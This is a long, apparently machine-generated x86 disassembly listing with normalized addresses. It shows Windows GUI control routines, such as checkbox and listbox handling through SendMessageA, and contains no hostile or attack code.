je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403430
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43a221
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a29a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442bb8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45997c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_448824
mov eax ebx
mov si 0xffb8
call sub_403430
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403430
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a2a1
sub_43a2a8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_44882c
pop edi
pop esi
pop ebx
retn
sub_43a2fc
push ebx
push esi
mov esi edx
mov ebx eax
call sub_433abc
call sub_433b9c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_43a328
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_433abc
mov ebx eax
mov eax ebx
call sub_433b9c
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4493d8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_433c9c
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43a374
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_439e44
mov edx 0x61
mov eax esi
call sub_442374
mov edx 0x11
mov eax esi
call sub_442398
mov dl 0x1
mov eax esi
call sub_44960c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_43a3e0
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403430
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_43a40c
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_43a494
retn
mov dl 0x2
call sub_43a494
jmp r-xdata
xor edx edx
call sub_43a494
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_43a494
jmp r-xdata
sub_43a494
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_4496dc
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403430
sub_43a4e8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43a000
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_446158
mov eax ebx
mov si 0xffc8
call sub_403430
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_43a543
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x41f5173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop ebx
retn
sub_43a58c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a61a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442bb8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45997c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_448824
mov eax ebx
mov si 0xffb8
call sub_403430
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_403430
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a621
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_43a638
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_439e44
mov edx 0x71
mov eax esi
call sub_442374
mov edx 0x11
mov eax esi
call sub_442398
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_43a6a0
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403430
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_43a6e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4460d0
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_446094
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_44f434
sub_43a79c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44960c
mov eax [ ebp - 0x4 ]
call sub_4496dc
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_4493d8
push eax
call SendMessageA
push ebp
call sub_43a6e0
pop ecx
mov eax [ ebp - 0x4 ]
call sub_4427c4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403430
sub_43a828
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43a000
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_446158
mov eax ebx
mov si 0xffc8
call sub_403430
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_43a87f
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x4531173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop ebx
retn
sub_43a8b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a929
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442bb8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45997c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_448824
mov eax ebx
mov si 0xffb8
call sub_403430
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a930
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_43a938
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403430
jmp r-xdata
pop esi
retn
sub_43a984
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43aa48
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
push 0x0
push edi
push 0x18a
mov eax esi
call sub_4493d8
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_43c5e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404654
test esi esi
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax ebx
call sub_41b438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43aa4f
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4044c8
push eax
push edi
push 0x189
mov eax [ ebx + 0x10 ]
call sub_4493d8
push eax
call SendMessageA
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404654
sub_43aa58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43aadb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffb1
call sub_403430
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43c608
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43aae2
lea eax [ ebp - 0x8 ]
call sub_404008
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41b438
sub_43aaec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ esp + 0x4 ] eax
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb3
call sub_403430
mov [ esp + 0x8 ] eax
xor ecx ecx
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403430
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push 0x0
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ecx [ esp + 0x8 ]
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_403430
mov edx [ esp + 0x4 ]
mov eax [ edi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43ab6c
push esi
mov esi eax
cmp edx 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
mov eax [ esi + 0x10 ]
mov si 0xffb0
call sub_403430
sub_43ab94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43ac21
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ac28
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
push 0x0
push 0x180
mov eax edi
call sub_4493d8
push eax
call SendMessageA
mov esi eax
test esi esi
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
sub_43ac34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43acbd
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43acc4
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
push edi
push 0x181
mov eax esi
call sub_4493d8
push eax
call SendMessageA
test eax eax
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
sub_43acdc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43ae2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ae33
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
mov eax [ ebp - 0x4 ]
call sub_41b2bc
xor eax eax
push ebp
push sub_43ae0a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403430
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov si 0xffb3
call sub_403430
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb2
call sub_403430
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403430
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b378
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_43ae4c
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4493d8
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_4430f4
sub_43ae80
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
call sub_4044c8
push eax
push 0xffffffff
push 0x1a2
mov eax esi
call sub_4493d8
push eax
call SendMessageA
mov edx edi
mov eax esi
call sub_43c630
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43aec4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43afc3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43afca
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
call sub_41b2bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x1
xor eax eax
push ebp
push sub_43afa6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_41b378
retn
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_403430
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
xor ecx ecx
mov edx ebx
mov si 0xffb2
call sub_403430
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_403430
sub_43afd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4450cc
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax ebx
call sub_442374
mov edx 0x61
mov eax ebx
call sub_442398
mov dl 0x1
mov eax ebx
call sub_44960c
xor edx edx
mov eax ebx
call sub_442d7c
mov [ ebx + 0x210 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x218 ] esi
mov [ esi + 0x10 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4243c0
mov esi eax
mov [ ebx + 0x228 ] esi
mov eax esi
mov edx ebx
call sub_441794
mov [ ebx + 0x230 ] 0x10
mov [ ebx + 0x224 ] 0x1
mov [ ebx + 0x23b ] 0x1
mov [ ebx + 0x234 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_43b0c0
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4451f0
mov eax [ esi + 0x228 ]
call sub_403234
mov eax [ esi + 0x218 ]
call sub_403234
mov eax [ esi + 0x240 ]
call sub_403234
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_43b18c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x199
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43b1ac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x19a
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_43b1e8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x182
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_43b208
push ebx
mov ebx eax
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
pop ebx
retn
push 0x0
push 0x0
push 0x184
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
sub_43b23c
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
xor ecx ecx
mov edx edi
mov eax esi
call sub_43b690
inc edi
dec ebx
jne r-xdata
jmp r-xdata
sub_43b284
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43b39b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b3a2
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_40402c
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4044c8
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404200
mov eax [ ebp - 0x14 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0x218 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4044c8
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404200
mov eax [ ebp - 0xc ]
push eax
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0xd4 ]
mov edx esi
mov eax ebx
call sub_43b640
test al al
je r-xdata
jmp r-xdata
sub_43b3ac
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax esi
call sub_43b640
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
sub_43b418
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
jle r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
jle r-xdata
mov eax ebx
call sub_4425bc
mov [ esp ] eax
fild [ esp ]
fild [ ebx + 0x22c ]
fdivp st1
call sub_402a08
mov esi eax
cmp esi 0x1
jge r-xdata
push 0x0
push esi
push 0x195
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
mov esi 0x1
sub_43b46c
push ebx
mov ebx eax
cmp edx [ ebx + 0x22c ]
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_446940
jmp r-xdata
test edx edx
jne r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_4496dc
test al al
je r-xdata
mov eax ebx
call sub_43b418
sub_43b4b0
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x188
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x19f
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
pop ebx
retn
sub_43b52c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push esi
push 0x186
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
push 0x0
push esi
push 0x19e
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
jmp r-xdata
sub_43b58c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x239 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x239 ] dl
mov eax ebx
call sub_446940
mov eax ebx
mov si 0xffd0
call sub_403430
sub_43b5b4
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x230 ]
mov eax ebx
call sub_4496dc
test al al
je r-xdata
mov eax esi
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov edx 0x198
mov eax ebx
call sub_443d6c
mov esi [ esp + 0xc ]
sub esi [ esp + 0x4 ]
sub_43b640
push ebx
push esi
add esp 0xfffffff8
